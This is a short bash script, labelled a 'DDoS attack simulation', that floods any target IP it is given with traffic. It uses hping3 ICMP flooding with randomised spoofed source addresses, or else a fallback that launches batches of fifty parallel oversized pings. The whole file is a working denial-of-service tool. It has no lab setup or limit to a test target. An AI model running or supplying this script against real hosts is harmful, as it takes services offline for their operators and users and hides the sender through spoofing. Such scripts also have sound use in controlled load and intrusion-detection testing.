#!/bin/bash
# DDoS Attack Simulation - High-rate flooding attack

TARGET=$1
DURATION=${2:-30}
RATE=${3:-2000}  # packets per second

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip> [duration_seconds] [rate_pps]"
    exit 1
fi

echo "Starting DDoS attack on $TARGET for $DURATION seconds at $RATE pps..."

# Method 1: Use hping3 if available (best option)
if command -v hping3 &> /dev/null; then
    echo "Using hping3 for attack..."
    timeout $DURATION hping3 -1 --flood --rand-source $TARGET > /dev/null 2>&1
    
# Method 2: Aggressive ping flood
else
    echo "Using ping flood for attack..."
    END=$((SECONDS+DURATION))
    
    # Launch multiple parallel ping processes for higher rate
    while [ $SECONDS -lt $END ]; do
        # Launch 50 pings in parallel every second
        for i in {1..50}; do
            ping -c 1 -s 1400 -W 1 $TARGET > /dev/null 2>&1 &
        done
        sleep 0.02  # Small delay to prevent CPU overload
    done
    
    # Wait for background processes
    wait
fi

echo "DDoS attack completed"